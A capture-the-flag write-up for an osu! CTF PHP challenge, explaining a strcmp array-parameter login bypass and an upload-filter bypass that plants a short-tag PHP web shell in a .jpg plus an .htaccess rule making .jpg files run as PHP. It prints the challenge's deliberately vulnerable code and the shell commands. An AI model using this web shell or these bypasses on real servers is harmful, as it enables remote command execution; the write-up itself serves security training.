# web/admin-panel

by WoodMan

## Summary

> we found the secret osu! admin panel!!
> can you find a way to log in and read the flag?

## Challenge Solving

```php
// login.php
<?php
    session_start();
    $admin_password = bin2hex(random_bytes(16));
    
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $username = $_POST["username"];
        $password = $_POST["password"];
        
        if ($username == "peppy" && strcmp($admin_password, $password) == 0) {
            $_SESSION["logged_in"] = true;
            header("Location: admin.php");
            exit();
        }
    }
    
    header("Location: index.php");
?>
```

The main issue lies in line 10 with the `strcmp` comparison. I can change the incoming `password` from a string to `password[]`, which makes `$password` an array instead of a string. When the comparison is performed, since the parameter is not a string, it will throw a warning and return `NULL` (indicating failure). However, due to PHP’s loose comparison, `NULL == 0` is considered equal, so the condition `strcmp(...) == 0` evaluates to true, allowing the check to be bypassed.

Once triggered, simply request `/admin.php` to view the upload page.

```php
// admin.php
<?php
  session_start();
  if (!isset($_SESSION["logged_in"])) {
    header("Location: index.php");
    exit();
  }

  if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_FILES["file"])) {
      $file = $_FILES["file"];
      $filename = $file["name"];
      $contents = file_get_contents($file["tmp_name"]);

      if (stripos($filename, ".php") !== false) {
        echo "<h1>file is not allowed</h1>";
      }
      else if (stripos($contents, "<?php") !== false) {
        echo "<h1>file has unsafe contents</h1>";
      }
      else {
        move_uploaded_file($file["tmp_name"], "./uploads/" . $filename);
        header("Location: /uploads/" . $filename);
      }
      die();
    }
  }
?>
// ...
```

Next, to bypass the checks on lines 15 and 18, we can embed PHP code inside a `.jpg` file using the short open tag syntax. This allows us to bypass the first check for the `.php` file extension. At the same time, since we’re using short open tags, it won’t trigger the second check that looks for `<?php` in the file content.

* `echo '<? system($_GET["cmd"]); ?>' > shell.jpg`

When requesting `/shell.jpg?cmd=cat%20/flag.txt` it fails, so we need to make the `.jpg` executable. Modify the `.htaccess` via upload:

* `echo 'AddType application/x-httpd-php .jpg' > .htaccess`

This tells Apache to treat files with the `.jpg` extension as PHP and execute them with the PHP interpreter — essentially “executing JPG as PHP.”
At this point, requesting `/shell.jpg?cmd=cat%20/flag.txt` again will successfully retrieve the flag.

## Flag

`osu{php_is_too_3asy}`

